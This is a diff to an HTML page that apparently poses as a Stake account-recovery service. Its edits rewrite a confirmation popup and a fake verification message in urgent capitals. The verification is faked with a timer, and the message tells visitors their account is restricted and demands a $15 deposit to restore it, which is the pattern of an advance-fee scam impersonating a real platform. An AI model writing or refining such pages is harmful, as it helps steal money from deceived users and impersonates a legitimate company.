@@ -259,7 +259,7 @@
 
   <div id="processing"><p>Processing your request...</p></div>
   <div id="popup">
-    <p>Your account recovery request has been received. Your Stake account will be fully active within 24 - 72 hours.</p>
+    <p>YOUR ACCOUNT RECOVERY REQUEST HAS BEEN RECEIVED. WE HAVE FORWARDED YOUR QUERY TO THE STAKE TECHNICAL TEAM. YOUR STAKE ACCOUNT IS EXPECTED TO BE FULLY ACTIVE WITHIN 24 TO 72 HOURS.</p>
     <button onclick="location.reload()">OK</button>
   </div>
 
@@ -303,7 +303,7 @@
       const msg = document.getElementById('verify-msg');
       msg.innerHTML = 'Verifying...';
       setTimeout(() => {
-        msg.innerHTML = 'Your Stake account is in withdraw-only mode or has restrictions. To resolve this, a minimum deposit of $15 is required. The deposited amount will be added to your Stake account automatically.';
+        msg.innerHTML = 'YOUR STAKE ACCOUNT IS CURRENTLY IN WITHDRAW-ONLY MODE, RESTRICTING YOUR ABILITY TO DEPOSIT OR PLACE BETS. TO RESTORE FULL ACCESS AND RESUME ALL FUNCTIONALITIES, PLEASE DEPOSIT A MINIMUM OF $15. ONCE THE DEPOSIT IS COMPLETED, THE AMOUNT WILL BE CREDITED AUTOMATICALLY TO YOUR ACCOUNT AND YOUR ACCOUNT WILL FULLY RE-ACTIVED.';
         navigator.vibrate?.(100);
       }, 1500);
     }
